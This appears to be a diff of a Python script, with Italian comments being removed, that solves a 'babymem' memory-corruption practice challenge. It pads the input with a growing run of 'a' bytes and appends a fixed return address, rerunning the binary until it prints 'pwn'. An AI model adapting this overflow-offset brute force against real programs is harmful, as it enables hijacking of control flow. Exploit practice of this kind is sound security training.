@@ -7,32 +7,23 @@ size = 1
 ret = b'\x80\x1e\x40' #cambia con ciò che ti interessa
 
 while('pwn' not in output):
-    #Interrompe se il size diventa troppo grande
     if (size > 300):
         break
     out = bytearray();
 
-    #aggiunge all'inizio dell'input la dimensione del buffer
     out += bytes(str(size + len(ret)) + '\n','utf-8')
 
-    #aggiunge 'size' di offset
     for x in range(size):
         out += b'a'
 
-    #aggiunge alla fine l'indirizzo di win o la variabile con cui devi sovrascrivere
     out += ret
 
     f = open('input', 'wb')
     f.write(out)
 
     input_file = open('input', 'r')
-    # Run the command and capture its output
     process = subprocess.Popen(['/challenge/babymem_level3.1'], stdout=subprocess.PIPE, stdin=input_file)
-
-    # Read the output from stdout
     output = process.communicate()[0]
-
-    # Decode the output from bytes to string
     output = output.decode('utf-8')
     size += 1
     process.kill()
